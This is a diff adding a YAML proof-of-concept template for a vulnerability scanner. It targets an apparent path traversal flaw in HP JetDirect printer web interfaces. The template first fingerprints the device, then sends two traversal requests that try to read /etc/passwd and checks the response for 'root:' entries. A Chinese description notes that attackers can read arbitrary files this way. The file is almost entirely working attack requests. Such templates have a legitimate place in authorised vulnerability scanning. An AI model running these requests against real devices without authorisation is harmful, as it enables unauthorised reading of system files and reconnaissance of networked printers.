@@ -1,0 +1,25 @@
+name: poc-yaml-hp-jetdirect-path-traversal
+groups:
+  detect:
+    - method: GET
+      path: /hp/device/this.LCDispatcher?in=VUE&res=&cmd=pgMar498.htm
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"HP") || response.body.bcontains(b"JetDirect"))
+  traversal:
+    - method: GET
+      path: /../../../etc/passwd
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"root:") || response.body.bcontains(b"nobody:"))
+    - method: GET
+      path: /hp/device/webaccess/etc/passwd
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"root:") || response.body.bcontains(b"nobody:"))
+detail:
+  author: L4xy
+  description: "HP JetDirect Web管理界面存在路径遍历漏洞，攻击者可通过构造特殊路径读取服务器任意文件，包括/etc/passwd等敏感文件"
+  links:
+    - https://github.com/advisories/GHSA-v7mr-5v8g-8mff
+  tags: printer,hp,path-traversal,fileread
